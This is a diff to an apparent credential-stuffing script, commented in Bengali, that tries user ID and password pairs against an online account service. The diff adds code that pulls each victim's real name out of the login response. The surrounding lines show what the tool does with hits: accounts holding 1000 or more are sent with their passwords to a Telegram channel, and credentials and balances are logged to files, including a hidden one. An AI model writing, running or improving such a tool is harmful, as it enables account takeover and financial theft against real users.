@@ -75,6 +75,56 @@ def get_balance_value(balance):
     except:
         return 0
 
+def get_user_name_from_response(data):
+    """রেসপন্স থেকে ইউজারের আসল নাম খুঁজে বের করা"""
+    try:
+        # বিভিন্ন গভীরে নাম খোঁজার জন্য পাথগুলো
+        name_paths = [
+            ['fullName'],
+            ['name'],
+            ['realName'],
+            ['nickName'],
+            ['userName'],
+            ['username'],
+            ['member', 'fullName'],
+            ['member', 'name'],
+            ['member', 'realName'],
+            ['userInfo', 'fullName'],
+            ['userInfo', 'name'],
+            ['profile', 'fullName'],
+            ['profile', 'name'],
+            ['account', 'fullName'],
+            ['account', 'name'],
+            ['data', 'fullName'],
+            ['data', 'name']
+        ]
+        
+        for path in name_paths:
+            current = data
+            found = True
+            for key in path:
+                if isinstance(current, dict) and key in current:
+                    current = current[key]
+                else:
+                    found = False
+                    break
+            if found and current and isinstance(current, str) and current.strip():
+                return current.strip()
+        
+        # কোনো নাম না পেলে userId থেকে নামের অংশ বের করার চেষ্টা
+        user_id = data.get('userId', '')
+        if user_id and isinstance(user_id, str):
+            # userId যদি নামের মত দেখতে হয় (যেমন: SumonAhmed, john_doe)
+            if re.match(r'^[A-Za-z]', user_id):
+                # ক্যাপিটাল লেটার দিয়ে নাম ফরম্যাট করা
+                name_parts = re.findall(r'[A-Z][a-z]*', user_id)
+                if name_parts:
+                    return ' '.join(name_parts)
+        
+        return None
+    except:
+        return None
+
 def attempt_login(user_id, pw):
     global successful_users
     with lock:
@@ -110,13 +160,16 @@ def attempt_login(user_id, pw):
                 level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
                 
-                # নাম পাওয়ার চেষ্টা (fullName, name, username, nickName)
-                name_keys = ['fullName', 'name', 'username', 'nickName', 'realName']
-                display_name = uid  # ডিফল্ট হিসেবে ID
-                for key in name_keys:
-                    if key in data and data[key]:
-                        display_name = data[key]
-                        break
+                # আসল নাম খুঁজে বের করা
+                real_name = get_user_name_from_response(data)
+                
+                # নাম না পেলে ট্রাই করে ইউজারনেম/আইডি থেকে নাম বের করা
+                if not real_name:
+                    real_name = get_user_name_from_response({'userId': uid})
+                
+                # তবুও না পেলে ডিফল্ট মেসেজ
+                if not real_name:
+                    real_name = f"User ({uid[:10]}...)" if len(uid) > 10 else f"User ({uid})"
 
                 with lock: successful_users.add(user_id)
                 
@@ -129,7 +182,7 @@ def attempt_login(user_id, pw):
                 bal_val = get_balance_value(balance)
                 
                 if bal_val >= 1000:
-                    send_telegram(uid, pw, balance, level, display_name)
+                    send_telegram(uid, pw, balance, level, real_name)
                     if bal_val >= 10000: 
                         earn = '100 BDT'
                         color = C
@@ -137,15 +190,15 @@ def attempt_login(user_id, pw):
                         earn = '50 BDT'
                         color = G
 
-                # এখন শুধু নাম প্রিন্ট করবে (ID নয়)
-                print(f'{BOLD}{color} Name: {display_name} | Profile : {status} | Earned : {earn} {D}')
+                # এখন শুধু আসল নাম প্রিন্ট করবে
+                print(f'{BOLD}{color} Name: {real_name} | Profile : {status} | Earned : {earn} {D}')
 
                 with open(filename, 'a', encoding='utf-8') as f:
-                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level} | Name: {display_name}\n')
+                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level} | Name: {real_name}\n')
                     
                 if bal_val > 0:
                     with open('.balances.txt', 'a', encoding='utf-8') as f:
-                        f.write(f'{uid} | {pw} | {balance} | {level} | {display_name}\n')
+                        f.write(f'{uid} | {pw} | {balance} | {level} | {real_name}\n')
 
             elif res.get('status') == 'S0001': 
                 time.sleep(10)
